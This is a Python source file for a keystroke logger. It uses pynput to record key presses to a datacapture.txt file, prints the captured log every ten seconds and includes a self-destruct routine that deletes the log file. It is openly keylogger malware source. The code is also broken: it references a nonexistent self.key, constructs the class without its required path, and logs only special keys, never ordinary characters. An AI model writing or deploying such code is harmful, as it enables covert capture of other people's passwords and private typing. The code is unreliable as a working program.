from pynput.keyboard import *
import os,time,threading

class Keylogger:

    def __init__(self,path):
        self.PATH = path + '\\datacapture.txt'
        self.flag = 0
        self.keys = []
        self.count  = 0

    def read_file(self):
        with open(self.PATH,'rt') as f:
            return f.read()

    def write_file(self,keys):
        with open(self.PATH,'a') as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find('backspace') >0:
                    f.write(' [BACKSPACE] ')
                elif k.find('enter') >0:
                    f.write('\n')
                elif k.find('shift') >0:
                    f.write(' [SHIFT] ')
                elif k.find('space') >0:
                    f.write(' ')
                elif k.find('caps_lock') >0:
                    f.write(' [CAPS_LOCK] ')

    def on_press(self,key):
        self.keys.append(key)
        self.count+=1
        if self.count>=1:
            self.count=0
            self.write_file(self.key)
            self.keys=[]

    def self_destruct(self):
        self.flag=1
        l.stop()
        os.remove(self.PATH)

    def start(self):
        global l
        with Listener(on_press=self.on_press) as l:
            l.join()


if __name__=='__main__':
    keylogger = Keylogger()
    t = threading.Thread(target=keylogger.start)
    t.start()
    while keylogger.flag !=1:
        time.sleep(10)
        logs = keylogger.read_file()
        print(logs)
    keylogger.self_destruct()
    t.join()
